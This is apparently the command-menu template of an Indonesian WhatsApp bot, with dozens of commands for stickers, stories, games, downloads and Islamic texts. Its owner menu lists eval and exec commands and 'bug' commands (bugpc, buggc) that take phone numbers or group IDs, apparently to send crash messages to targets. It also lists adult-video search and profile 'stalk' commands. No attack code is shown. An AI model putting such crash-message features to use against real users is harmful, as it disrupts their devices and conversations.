‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎

┌──『 ${ya}Owner Menu${ya} 』
│ ${ya}${Yy+=1} $ [EXE]${ya}
│ ${ya}${Yy+=1} > [EVAL]${ya}
│ ${ya}${Yy+=1} < [EVAL2]${ya}
│ ${ya}${Yy+=1} => [ASYNC]${ya}
│ ${ya}${Yy+=1} ${prefix}bugdoc 9${ya}
│ ${ya}${Yy+=1} ${prefix}bugstick 9${ya}
│ ${ya}${Yy+=1} ${prefix}bugbutton 9${ya}
│ ${ya}${Yy+=1} ${prefix}bugpc 6288224893756|9|10s${ya}
│ ${ya}${Yy+=1} ${prefix}buggc 97455446178-1461236988@g.us|9${ya}
│ ${ya}${Yy+=1} ${prefix}buggc2 97455446178-1461236988@g.us|9|10s${ya}
│ ${ya}${Yy+=1} ${prefix}setppbot 'panjang' <reply foto>${ya}
│ ${ya}${Yy+=1} ${prefix}sewa <add 1d>${ya}
│ ${ya}${Yy+=1} ${prefix}sewa <del>${ya}
│ ${ya}${Yy+=1} ${prefix}listsewa${ya}
│ ${ya}${Yy+=1} ${prefix}ceksewa${ya}
│ ${ya}${Yy+=1} ${prefix}getcase${ya}
│ ${ya}${Yy+=1} ${prefix}creategc${ya}
│ ${ya}${Yy+=1} ${prefix}join${ya}
│ ${ya}${Yy+=1} ${prefix}public${ya}
│ ${ya}${Yy+=1} ${prefix}self${ya}
│ ${ya}${Yy+=1} ${prefix}out${ya}
│ ${ya}${Yy+=1} ${prefix}addowner 628×××${ya}
│ ${ya}${Yy+=1} ${prefix}delowner 628×××${ya}
│ ${ya}${Yy+=1} ${prefix}addprem${ya}
│ ${ya}${Yy+=1} ${prefix}delprem${ya}
│ ${ya}${Yy+=1} ${prefix}listpremium${ya}
│ ${ya}${Yy+=1} ${prefix}ban/block add 6287×××${ya}
│ ${ya}${Yy+=1} ${prefix}ban/block del 6287×××${ya}
│ ${ya}${Yy+=1} ${prefix}listblock/listban${ya}
│ ${ya}${Yy+=1} ${prefix}bcall${ya}
│ ${ya}${Yy+=1} ${prefix}bcaudio${ya}
│ ${ya}${Yy+=1} ${prefix}bcvidio${ya}
│ ${ya}${Yy+=1} ${prefix}bcimg${ya}
└──────
┌──『 ${ya}Topup Diamond${ya} 』
│ ${ya}${Yy+=1} ${prefix}topupff <id ff>${ya}
└──────
┌──『 ${ya}Nulis Menu${ya} 』
│ ${ya}${Yy+=1} ${prefix}nulis <teks>${ya}
│ ${ya}${Yy+=1} ${prefix}nuliskanan <teks>${ya}
│ ${ya}${Yy+=1} ${prefix}nuliskiri <teks>${ya}
│ ${ya}${Yy+=1} ${prefix}foliokanan <teks>${ya}
│ ${ya}${Yy+=1} ${prefix}foliokiri <teks>${ya}
└──────
┌──『 ${ya}Kalkulator${ya} 』
│ ${ya}${Yy+=1} ${prefix}tambah <2 2>${ya}
│ ${ya}${Yy+=1} ${prefix}kurang <2 2>${ya}
│ ${ya}${Yy+=1} ${prefix}kali <2 2>${ya}
│ ${ya}${Yy+=1} ${prefix}bagi <2 2>${ya}
└──────
┌──『 ${ya}Other Menu${ya} 』
│ ${ya}${Yy+=1} ${prefix}owner${ya}
│ ${ya}${Yy+=1} ${prefix}credits${ya}
│ ${ya}${Yy+=1} ${prefix}groupkirbotz${ya}
│ ${ya}${Yy+=1} ${prefix}readmore${ya}
│ ${ya}${Yy+=1} ${prefix}rules${ya}
│ ${ya}${Yy+=1} ${prefix}donasi${ya}
│ ${ya}${Yy+=1} ${prefix}sewabot${ya}
│ ${ya}${Yy+=1} ${prefix}scriptbot${ya}
│ ${ya}${Yy+=1} ${prefix}profile${ya}
│ ${ya}${Yy+=1} ${prefix}sticker${ya}
│ ${ya}${Yy+=1} ${prefix}smeme${ya}
│ ${ya}${Yy+=1} ${prefix}attp${ya}
│ ${ya}${Yy+=1} ${prefix}ttp${ya}
│ ${ya}${Yy+=1} ${prefix}tts${ya}
│ ${ya}${Yy+=1} ${prefix}tourl${ya}
│ ${ya}${Yy+=1} ${prefix}toimg${ya}
│ ${ya}${Yy+=1} ${prefix}tovideo${ya}
│ ${ya}${Yy+=1} ${prefix}tovn${ya}
│ ${ya}${Yy+=1} ${prefix}tomp3${ya}
│ ${ya}${Yy+=1} ${prefix}ssweb${ya}
│ ${ya}${Yy+=1} ${prefix}emojimix${ya}
│ ${ya}${Yy+=1} ${prefix}emoji${ya}
│ ${ya}${Yy+=1} ${prefix}lirik${ya}
│ ${ya}${Yy+=1} ${prefix}translate${ya}
│ ${ya}${Yy+=1} ${prefix}namapeople${ya}
│ ${ya}${Yy+=1} ${prefix}faktaunik${ya}
│ ${ya}${Yy+=1} ${prefix}katabijak${ya}
│ ${ya}${Yy+=1} ${prefix}pantun${ya}
│ ${ya}${Yy+=1} ${prefix}bucin${ya}
│ ${ya}${Yy+=1} ${prefix}quotes${ya}
│ ${ya}${Yy+=1} ${prefix}randomnama${ya}
│ ${ya}${Yy+=1} ${prefix}halah${ya}
│ ${ya}${Yy+=1} ${prefix}hilih${ya}
│ ${ya}${Yy+=1} ${prefix}huluh${ya}
│ ${ya}${Yy+=1} ${prefix}heleh${ya}
│ ${ya}${Yy+=1} ${prefix}holoh${ya}
│ ${ya}${Yy+=1} ${prefix}cry${ya}
│ ${ya}${Yy+=1} ${prefix}kill${ya}
│ ${ya}${Yy+=1} ${prefix}hug${ya}
│ ${ya}${Yy+=1} ${prefix}pat${ya}
│ ${ya}${Yy+=1} ${prefix}lick${ya}
│ ${ya}${Yy+=1} ${prefix}kiss${ya}
│ ${ya}${Yy+=1} ${prefix}bite${ya}
│ ${ya}${Yy+=1} ${prefix}yeet${ya}
│ ${ya}${Yy+=1} ${prefix}bully${ya}
│ ${ya}${Yy+=1} ${prefix}bonk${ya}
│ ${ya}${Yy+=1} ${prefix}wink${ya}
│ ${ya}${Yy+=1} ${prefix}poke${ya}
│ ${ya}${Yy+=1} ${prefix}nom${ya}
│ ${ya}${Yy+=1} ${prefix}slap${ya}
│ ${ya}${Yy+=1} ${prefix}smile${ya}
│ ${ya}${Yy+=1} ${prefix}wave${ya}
│ ${ya}${Yy+=1} ${prefix}awoo${ya}
│ ${ya}${Yy+=1} ${prefix}blush${ya}
│ ${ya}${Yy+=1} ${prefix}smug${ya}
│ ${ya}${Yy+=1} ${prefix}glomp${ya}
│ ${ya}${Yy+=1} ${prefix}happy${ya}
│ ${ya}${Yy+=1} ${prefix}dance${ya}
│ ${ya}${Yy+=1} ${prefix}cringe${ya}
│ ${ya}${Yy+=1} ${prefix}cuddle${ya}
│ ${ya}${Yy+=1} ${prefix}highfive${ya}
│ ${ya}${Yy+=1} ${prefix}handhold${ya}
│ ${ya}${Yy+=1} ${prefix}dadu${ya}
│ ${ya}${Yy+=1} ${prefix}patrick${ya}
│ ${ya}${Yy+=1} ${prefix}amongus${ya}
│ ${ya}${Yy+=1} ${prefix}gawrgura${ya}
│ ${ya}${Yy+=1} ${prefix}anjing${ya}
│ ${ya}${Yy+=1} ${prefix}bucinstick${ya}
└──────
┌──『 ${ya}Random Cerita${ya} 』
│ ${ya}${Yy+=1} ${prefix}cerpen${ya}
│ ${ya}${Yy+=1} ${prefix}ceritahoror${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-sejarah${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-sedih${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-sastra${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-romantis${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-rohani${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-rindu${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-remaja${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-ramadhan${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-petualangan${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-persahabatan${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-perpisahan${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-perjuangan${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-penyesalan${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-pengorbanan${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-pengalaman${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-pendidikan${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-penantian${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-patahhati${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-olahraga${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-nasionalisme${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-nasihat${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-motivasi${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-misteri${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-mengharukan${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-malaysia${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-liburan${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-kristen${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-korea${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-kisahnyata${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-keluarga${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-kehidupan${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-jepang${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-inspiratif${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-gokil${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-galau${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-cintasejati${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-cintasegitiga${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-cintasedih${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-cintaromantis${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-cintapertama${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-cintaislami${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-cinta${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-budaya${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-bahasasunda${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-bahasajawa${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-bahasainggris${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-bahasadaerah${ya}
│ ${ya}${Yy+=1} ${prefix}cerpen-anak${ya}
└──────
┌──『 ${ya}Wibu Menu${ya} 』
│ ${ya}${Yy+=1} ${prefix}anime${ya}
│ ${ya}${Yy+=1} ${prefix}nekopoisearch${ya}
│ ${ya}${Yy+=1} ${prefix}nekopoi${ya}
│ ${ya}${Yy+=1} ${prefix}kusonime${ya}
│ ${ya}${Yy+=1} ${prefix}lk21${ya}
│ ${ya}${Yy+=1} ${prefix}character${ya}
│ ${ya}${Yy+=1} ${prefix}manga${ya}
│ ${ya}${Yy+=1} ${prefix}pinterest2${ya}
└──────
┌──『 ${ya}Group Menu${ya} 』
│ ${ya}${Yy+=1} ${prefix}linkgroup${ya}
│ ${ya}${Yy+=1} ${prefix}antilink <on>${ya}
│ ${ya}${Yy+=1} ${prefix}antilink <off>${ya}
│ ${ya}${Yy+=1} ${prefix}antiwame <on>${ya}
│ ${ya}${Yy+=1} ${prefix}antiwame <off>${ya}
│ ${ya}${Yy+=1} ${prefix}autosticker <1>${ya}
│ ${ya}${Yy+=1} ${prefix}autosticker <0>${ya}
│ ${ya}${Yy+=1} ${prefix}group <open>${ya}
│ ${ya}${Yy+=1} ${prefix}group <close>${ya}
│ ${ya}${Yy+=1} ${prefix}add 628××××${ya}
│ ${ya}${Yy+=1} ${prefix}kick @tag${ya}
│ ${ya}${Yy+=1} ${prefix}tagall <teks>${ya}
│ ${ya}${Yy+=1} ${prefix}hidetag <teks>${ya}
│ ${ya}${Yy+=1} ${prefix}promote @tag${ya}
│ ${ya}${Yy+=1} ${prefix}demote @tag${ya}
│ ${ya}${Yy+=1} ${prefix}setppgc <reply foto>${ya}
│ ${ya}${Yy+=1} ${prefix}setppgc2 'panjang' <reply foto>${ya}
│ ${ya}${Yy+=1} ${prefix}setname <name>${ya}
│ ${ya}${Yy+=1} ${prefix}setdesc <teks>${ya}
│ ${ya}${Yy+=1} ${prefix}listgc${ya}
└──────
┌──『 ${ya}Game Menu${ya} 』
│ ${ya}${Yy+=1} ${prefix}goblokcek${ya} 
│ ${ya}${Yy+=1} ${prefix}jelekcek${ya} 
│ ${ya}${Yy+=1} ${prefix}gaycek${ya}
│ ${ya}${Yy+=1} ${prefix}lesbicek${ya}
│ ${ya}${Yy+=1} ${prefix}gantengcek${ya} 
│ ${ya}${Yy+=1} ${prefix}cantikcek${ya}
│ ${ya}${Yy+=1} ${prefix}begocek${ya} 
│ ${ya}${Yy+=1} ${prefix}suhucek${ya}
│ ${ya}${Yy+=1} ${prefix}pintercek${ya}
│ ${ya}${Yy+=1} ${prefix}jagocek${ya}
│ ${ya}${Yy+=1} ${prefix}nolepcek${ya}
│ ${ya}${Yy+=1} ${prefix}babicek${ya}
│ ${ya}${Yy+=1} ${prefix}bebancek${ya}
│ ${ya}${Yy+=1} ${prefix}baikcek${ya}
│ ${ya}${Yy+=1} ${prefix}jahatcek${ya}
│ ${ya}${Yy+=1} ${prefix}anjingcek${ya}
│ ${ya}${Yy+=1} ${prefix}haramcek${ya}
│ ${ya}${Yy+=1} ${prefix}pakboycek${ya}
│ ${ya}${Yy+=1} ${prefix}pakgirlcek${ya}
│ ${ya}${Yy+=1} ${prefix}sangecek${ya} 
│ ${ya}${Yy+=1} ${prefix}bapercek${ya}
│ ${ya}${Yy+=1} ${prefix}fakboycek${ya}
│ ${ya}${Yy+=1} ${prefix}alimcek${ya}
│ ${ya}${Yy+=1} ${prefix}suhucek${ya}
│ ${ya}${Yy+=1} ${prefix}fakgirlcek${ya}
│ ${ya}${Yy+=1} ${prefix}kerencek${ya}
│ ${ya}${Yy+=1} ${prefix}wibucek${ya}
│ ${ya}${Yy+=1} ${prefix}pasarkascek${ya}
│ ${ya}${Yy+=1} ${prefix}jadian${ya}
│ ${ya}${Yy+=1} ${prefix}apakah${ya}
│ ${ya}${Yy+=1} ${prefix}rate${ya}
│ ${ya}${Yy+=1} ${prefix}kapankah${ya}
│ ${ya}${Yy+=1} ${prefix}bisakah${ya}
│ ${ya}${Yy+=1} ${prefix}kuismath${ya}
│ ${ya}${Yy+=1} ${prefix}tebak lagu${ya}
│ ${ya}${Yy+=1} ${prefix}tebak gambar${ya}
│ ${ya}${Yy+=1} ${prefix}tebak kata${ya}
│ ${ya}${Yy+=1} ${prefix}tebak kalimat${ya}
│ ${ya}${Yy+=1} ${prefix}tebak lirik${ya}
│ ${ya}${Yy+=1} ${prefix}tebak lontong${ya}
└──────
┌──『 ${ya}Download Menu${ya} 』
│ ${ya}${Yy+=1} ${prefix}ytsearch <query>${ya}
│ ${ya}${Yy+=1} ${prefix}play <query>${ya}
│ ${ya}${Yy+=1} ${prefix}ytmp4 <link>${ya}
│ ${ya}${Yy+=1} ${prefix}ytmp3 <link>${ya}
│ ${ya}${Yy+=1} ${prefix}playmp4 <query>${ya}
│ ${ya}${Yy+=1} ${prefix}playmp3 <query>${ya}
│ ${ya}${Yy+=1} ${prefix}tiktoknowm <link>${ya}
│ ${ya}${Yy+=1} ${prefix}tiktokaudio <link>${ya}
│ ${ya}${Yy+=1} ${prefix}mediafire <link>${ya}
│ ${ya}${Yy+=1} ${prefix}xnxxsearch <query>${ya}
│ ${ya}${Yy+=1} ${prefix}xnxxvideo <link>${ya}
│ ${ya}${Yy+=1} ${prefix}spotify <link>${ya}
│ ${ya}${Yy+=1} ${prefix}spotifysearch <query>${ya}
│ ${ya}${Yy+=1} ${prefix}jooxplay <query>${ya}
│ ${ya}${Yy+=1} ${prefix}zippysearch <link>${ya}
│ ${ya}${Yy+=1} ${prefix}tiktokstalk <nama tiktok>${ya}
│ ${ya}${Yy+=1} ${prefix}githubstalk <nama github>${ya}
│ ${ya}${Yy+=1} ${prefix}igstalk <nama ig>${ya}
│ ${ya}${Yy+=1} ${prefix}ytstalk <nama yt>${ya}
│ ${ya}${Yy+=1} ${prefix}ffstalk <id ff>${ya}
│ ${ya}${Yy+=1} ${prefix}npmstalk <nama npm>${ya}
└──────
┌──『 ${ya}Islam Menu${ya} 』
│ ${ya}${Yy+=1} ${prefix}asmaulhusna${ya}
│ ${ya}${Yy+=1} ${prefix}iqra${ya}
│ ${ya}${Yy+=1} ${prefix}hadist${ya}
│ ${ya}${Yy+=1} ${prefix}juzamma${ya}
│ ${ya}${Yy+=1} ${prefix}listsurah${ya}
│ ${ya}${Yy+=1} ${prefix}jadwalsholat${ya}
│ ${ya}${Yy+=1} ${prefix}kisahnabi${ya}
│ ${ya}${Yy+=1} ${prefix}tafsirsurah${ya}
│ ${ya}${Yy+=1} ${prefix}ayatkursi${ya}
│ ${ya}${Yy+=1} ${prefix}bacaanshalat${ya}
│ ${ya}${Yy+=1} ${prefix}niatshalat${ya}
└──────
┌──『 ${ya}Sound Menu${ya} 』
│ ${ya}${Yy+=1} ${prefix}sound1${ya}
│ ${ya}${Yy+=1} ${prefix}sound2${ya}
│ ${ya}${Yy+=1} ${prefix}sound3${ya}
│ ${ya}${Yy+=1} ${prefix}sound4${ya}
│ ${ya}${Yy+=1} ${prefix}sound5${ya}
│ ${ya}${Yy+=1} ${prefix}sound6${ya}
│ ${ya}${Yy+=1} ${prefix}sound7${ya}
│ ${ya}${Yy+=1} ${prefix}sound8${ya}
│ ${ya}${Yy+=1} ${prefix}sound9${ya}
│ ${ya}${Yy+=1} ${prefix}sound10${ya}
│ ${ya}${Yy+=1} ${prefix}sound11${ya}
│ ${ya}${Yy+=1} ${prefix}sound12${ya}
│ ${ya}${Yy+=1} ${prefix}sound13${ya}
│ ${ya}${Yy+=1} ${prefix}sound14${ya}
│ ${ya}${Yy+=1} ${prefix}sound15${ya}
│ ${ya}${Yy+=1} ${prefix}sound16${ya}
│ ${ya}${Yy+=1} ${prefix}sound17${ya}
│ ${ya}${Yy+=1} ${prefix}sound18${ya}
│ ${ya}${Yy+=1} ${prefix}sound19${ya}
│ ${ya}${Yy+=1} ${prefix}sound20${ya}
│ ${ya}${Yy+=1} ${prefix}sound21${ya}
│ ${ya}${Yy+=1} ${prefix}sound22${ya}
│ ${ya}${Yy+=1} ${prefix}sound23${ya}
│ ${ya}${Yy+=1} ${prefix}sound24${ya}
│ ${ya}${Yy+=1} ${prefix}sound25${ya}
│ ${ya}${Yy+=1} ${prefix}sound26${ya}
│ ${ya}${Yy+=1} ${prefix}sound27${ya}
│ ${ya}${Yy+=1} ${prefix}sound28${ya}
│ ${ya}${Yy+=1} ${prefix}sound29${ya}
│ ${ya}${Yy+=1} ${prefix}sound30${ya}
│ ${ya}${Yy+=1} ${prefix}sound31${ya}
│ ${ya}${Yy+=1} ${prefix}sound32${ya}
│ ${ya}${Yy+=1} ${prefix}sound33${ya}
│ ${ya}${Yy+=1} ${prefix}sound34${ya}
│ ${ya}${Yy+=1} ${prefix}sound35${ya}
│ ${ya}${Yy+=1} ${prefix}sound36${ya}
│ ${ya}${Yy+=1} ${prefix}sound37${ya}
